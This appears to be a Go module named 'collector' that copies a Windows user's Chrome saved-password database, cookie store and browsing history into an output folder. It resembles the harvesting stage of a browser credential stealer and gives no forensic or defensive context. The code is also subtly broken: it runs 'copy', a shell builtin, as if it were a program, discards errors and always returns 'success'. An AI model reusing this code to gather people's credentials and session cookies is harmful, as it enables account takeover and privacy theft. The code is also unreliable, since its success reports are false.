package collector

import (
"os"
"os/exec"
)

type CollectResult struct {
Browser string
Status  string
Path    string
}

type Collector struct {
UserProfilePath string
}

func (c Collector) CollectChrome(outputPath string) CollectResult {
src := c.UserProfilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return CollectResult{Browser: "Chrome", Status: "success", Path: outputPath}
}

func (c Collector) CollectCookies(outputPath string) CollectResult {
src := c.UserProfilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return CollectResult{Browser: "Chrome", Status: "success", Path: outputPath}
}

func (c Collector) CollectHistory(outputPath string) CollectResult {
src := c.UserProfilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return CollectResult{Browser: "Chrome", Status: "success", Path: outputPath}
}

func (c Collector) CollectAll(outputPath string) CollectResult {
c.CollectChrome(outputPath + "\\chrome_login.db")
c.CollectCookies(outputPath + "\\chrome_cookies.db")
c.CollectHistory(outputPath + "\\chrome_history.db")
return CollectResult{Browser: "Chrome", Status: "success", Path: outputPath}
}

func CreatePath(path string) error {
return os.MkdirAll(path, 0755)
}
